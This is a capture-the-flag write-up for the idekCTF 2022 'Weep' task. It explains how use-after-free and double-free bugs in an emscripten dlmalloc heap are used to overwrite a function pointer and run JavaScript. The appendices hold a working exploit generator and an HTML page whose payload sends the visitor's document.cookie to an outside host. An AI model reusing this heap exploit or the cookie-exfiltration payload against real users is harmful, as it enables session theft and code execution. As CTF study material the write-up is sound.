# Weep - idekCTF 2022 (pwn, 8 solved, 497p)

## Introduction
Weep is a pwn task.

An archive containing a WASM binary, its source code, a website, and a
Dockerfile is given.

## Reverse engineering
The full source code is given away for this task.

There is a website that provides a web interface to interact with a WASM module.
The module exports 5 actions:
- add a new name in the pool
- delete a name from the pool
- edit a name
- greet (call `alert`) with a specific name
- change the title used in the greet option

The `setTitle` function has a unfulfillable condition that can be seen as a
hint:

```c
void setTitle(int val){
	if(val) title_fp = mrTitle;
	else title_fp = mrsTitle;
	if((long long)val == 0x1337133713371337) title_fp = emscripten_run_script;
}
```

This sets a function pointer that then gets called by `greet` (only once):

```c
void greet(int idx) {
	if(idx < 0 || idx >= MAX_TITLES) return;
	if(numCalls > 0) return;
	numCalls++;
	title_fp(titles[idx].name);
}
```


## Vulnerabilities
There is a use-after-free in `edit`: once a name has been deleted, nothing
prevents the user from editing the freed memory:

```c
void edit(int idx, char* name) {
	if(idx < 0 || idx >= MAX_TITLES) return;
	strncpy(titles[idx].name, name, titles[idx].len);
}
```

Similarly, nothing prevents the user from freeing twice the same name:

```c
void delete(int idx) {
	if(idx < 0 || idx >= MAX_TITLES) return;
	free(titles[idx].name);
}
```

## Exploitation
The [allocator] used by emscripten is based on Doug Lea's `dlmalloc`. It is the
same allocator that inspired glibc's `ptmalloc`.

[allocator]: https://github.com/emscripten-core/emscripten/blob/1eb457b031c0a85c2deec5f85c810abc669f0bff/system/lib/dlmalloc.c#L4632-L4885

There are no tcaches and no fastbins, but there are very few security checks.

The exploitation is pretty straightforward:
1. create a chunk;
2. delete it;
3. change its content to break the linked list;
4. allocate before the function pointer to change its value.

There is a small surprise : the target function will only evaluates JavaScript
code with a size below 24 characters.

The expected solution was probably to write a longer payload at an early address
in memory and call `eval(UTF8ToString(addr))`.

The author of this write-up leverage a short domain name to make 2-stage
exploit : the first stage redirects the bot to the second stage with
`location=...`.

The second stage creates a pop-up with a JavaScript payload in its name
attribute, and triggers the bug a second time to evaluate the window's name with
`eval(name)`.

**Flag**: `idek{Now_When_will_we_get_security_checks_in_the_heap_allocator?}`

## Appendices
### pwn.php
```php
<?php
$add   = fn(int $idx, string $name) : array => [0, $idx, $name];
$del   = fn(int $idx)               : array => [1, $idx];
$edit  = fn(int $idx, string $name) : array => [2, $idx, $name];
$greet = fn(int $idx)               : array => [3, $idx];
$title = fn(int $type)              : array => [4, $type];


$size = 0x29;

//          12345678901234567890123
$payload = 'eval(UTF8ToString(123))';
$payload = 'location="//xer.fr/yo/"';
assert(strlen($payload) <= 23);

$payload = [
	// add two chunks (to guard against top chunk)
	$add(0, str_repeat("A", $size)), // 0x10568
	$add(1, str_repeat("B", $size)),

	// delete first chunk, change its data
	$del(0),
	$edit(0, pack("V*", 0x10210, 0x13371337)),

	// allocate corrupted chunks
	$add(2, str_repeat("C", $size)),

	// overwrite function pointer
	$add(3, str_repeat("D", 0x28) . pack("V", 3)),

	// trigger payload
	$add(0, $payload),
	$greet(0),
];

echo base64_encode(json_encode($payload));
```

### index.html
```html
<script>
const host    = "http://localhost:1337/";
const payload = "W1swLDAsIkFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBIl0sWzAsMSwiQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkIiXSxbMSwwXSxbMiwwLCJcdTAwMTBcdTAwMDJcdTAwMDFcdTAwMDA3XHUwMDEzN1x1MDAxMyJdLFswLDIsIkNDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDIl0sWzAsMywiRERERERERERERERERERERERERERERERERERERERERERERERERERERFx1MDAwM1x1MDAwMFx1MDAwMFx1MDAwMCJdLFswLDAsImV2YWwobmFtZSkiXSxbMywwXV0="

const url = `${host}#${payload}`
window.open(url, "location.href='https://xer.fr/cb-'+document.cookie")
</script>
```
